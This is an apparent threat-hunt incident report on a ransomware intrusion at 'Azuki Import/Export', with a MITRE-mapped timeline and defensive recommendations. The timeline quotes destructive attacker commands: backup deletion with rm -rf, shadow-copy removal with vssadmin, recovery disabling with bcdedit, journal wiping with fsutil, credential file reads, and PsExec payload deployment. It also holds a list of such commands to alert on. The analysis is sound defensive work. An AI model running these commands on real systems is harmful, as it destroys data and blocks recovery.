Dead in the Water - Azuki Import/Export.md

|  Date of Report | 28-Dec-25         |
|-----------------|------------------|
| Severity Level  | CRITICAL         |
| Escalated To   | Joshua Makador – LOG(N) Pacific |
| Analyst         | Adetola Kolawole  |

## Summary of Events
A multi-stage ransomware attack targeted Azuki Import/Export by first compromising a Windows workstation, pivoting to a Linux backup server, destroying backups, stealing credentials, and later deploying ransomware across Windows systems. The attacker systematically disabled recovery mechanisms, established persistence, removed forensic artefacts, and dropped a ransom note to confirm impact.

## WHO
### Threat Actor Architecture

| IP / Domain        | Purpose                                   |
|--------------------|-------------------------------------------|
|  10.1.0.108      | Initial reconnection after dwell time        |
| PsExec64.exe      | Ransomeqare Deployment Tool  |
| wbadmin delete catalog -quiet     | Backup Deletion       |
| backup-admin  | Backdoor administrator account |
| SILENTLYNX_README.txt  | Payload Deployed |

##  WHAT  - Attacker Actions
- Used SSH for lateral movement from a compromised workstation
- Enumerated backup directories, files, users, and schedules
- Searched for and accessed credential files
- Destroyed backup archives
- Downloaded external tooling
- Deployed ransomware using PsExec
- Disabled Windows and Linux recovery mechanisms
- Established persistence via registry and scheduled tasks
- Deleted forensic evidence
- Dropped a ransom note after encryption

## UNIFIED TIMELINE / MITRE ATT&CK

| Time (UTC) | Action | Command / Evidence | MITRE ID |
|------------|--------|-------------------|----------|
| 11/25 05:39 | SSH lateral movement | `ssh.exe backup-admin@10.1.0.189` | T1021 |
| 11/25 05:47 | Directory enumeration | `ls --color=auto -la /backups/` | T1083 |
| 11/25 05:47 | Scheduled job reconnaissance | `cat /etc/crontab` | T1053 |
| 11/25 05:45 | Tool download | `curl -L -o destroy.7z ...` | T1105 |
| 11/24 14:14 | Credential access | `cat /backups/configs/all-credentials.txt` | T1552.001 |
| 11/25 05:47 | Backup destruction | `rm -rf /backups/archives` | T1485 |
| 11/25 05:47 | Service stopped | `systemctl stop cron` | T1489 |
| 11/25 05:47 | Service disabled | `systemctl disable cron` | T1489 |
| 11/25 06:03 | Lateral movement (Windows) | `PsExec64.exe ... silentlynx.exe` | T1021.002 |
| 11/25 06:04 | Shadow copy stopped | `net stop VSS /y` | T1490 |
| 11/25 06:04 | Backup engine stopped | `net stop wbengine /y` | T1490 |
| 11/25 06:04 | Recovery points deleted | `vssadmin delete shadows /all /quiet` | T1490 |
| 11/25 06:05 | Storage limited | `vssadmin resize shadowstorage ...` | T1490 |
| 11/25 06:04 | Recovery disabled | `bcdedit /set {default} recoveryenabled No` | T1490 |
| 11/25 06:07 | Registry persistence | `WindowsSecurityHealth` | T1547.001 |
| 11/25 06:07 | Scheduled task created | `Microsoft\Windows\Security\SecurityHealthService` | T1053.005 |
| 11/25 06:10 | Journal deletion | `fsutil usn deletejournal /D C:` | T1070.004 |
| 11/25 06:05 | Ransom note dropped | `SILENTLYNX_README.txt` | T1486 |

## MALICIOUS ARTIFACTS

- `destroy.7z`
- `silentlynx.exe`
- `SILENTLYNX_README.txt`
- Registry value: `WindowsSecurityHealth`
- Scheduled task: `\Microsoft\Windows\Security\SecurityHealthService`

---

## HOW (ATTACK FLOW)

1. **Initial Access & Lateral Movement**
   - SSH used from a compromised Windows host to a Linux backup server.

2. **Discovery**
   - Enumerated directories, backup archives, local users, and cron jobs.

3. **Credential Access**
   - Retrieved plaintext credentials from backup configuration files.

4. **Impact on Backups**
   - Deleted backup archives.
   - Stopped and disabled `cron` to prevent future backups.

5. **Ransomware Deployment**
   - Used PsExec to deploy the payload across Windows systems.

6. **Recovery Inhibition**
   - Disabled VSS, Windows Backup, system recovery, and shadow storage.

7. **Persistence**
   - Created registry autorun entry and scheduled task disguised as legitimate services.

8. **Anti-Forensics**
   - Deleted the NTFS USN journal to hide file system activity.

9. **Ransomware Success**
   - Dropped ransom note confirming successful encryption.

---

## RECOMMENDATIONS

### Short-Term

- Isolate all affected systems.
- Revoke and rotate exposed credentials.
- Rebuild the backup server from trusted media.
- Restore data from offline or immutable backups.
- Remove malicious registry keys and scheduled tasks.

### Long-Term

- Treat backup servers as Tier-0 assets.
- Enforce immutable and offline backup strategies.
- Alert on destructive commands:
  - `rm -rf`
  - `vssadmin`
  - `bcdedit`
  - `fsutil`
- Monitor access to credential files on Linux systems.
- Restrict PsExec usage and administrative shares.
- Enable Linux audit logging.
- Regularly test ransomware recovery scenarios.

---

## CONCLUSION

This incident represents a **backup-aware ransomware operation**.

The attacker deliberately targeted backups, credentials, recovery services, and forensic artefacts before deploying ransomware. This approach maximised impact and limited recovery options.

The activity shows mature tradecraft across both Linux and Windows environments and highlights the need to secure backup infrastructure as a high-risk asset.
